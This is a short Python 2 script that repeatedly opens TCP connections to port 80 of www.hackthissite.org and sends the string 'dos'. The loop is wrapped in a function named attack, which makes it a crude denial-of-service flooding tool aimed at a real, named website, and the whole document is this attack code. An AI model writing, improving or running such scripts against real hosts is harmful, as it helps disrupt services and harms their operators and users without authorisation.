import socket
import os
import sys
import time

host = 'www.hackthissite.org'
message = 'dos'
conn = 1000
ip = socket.gethostbyname(host)


def attack():

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock.connect((host, 80))
    sock.send(message)
    print sock.recv(20)

    sock.close()

for i in range(1, conn):
    print i
    attack()

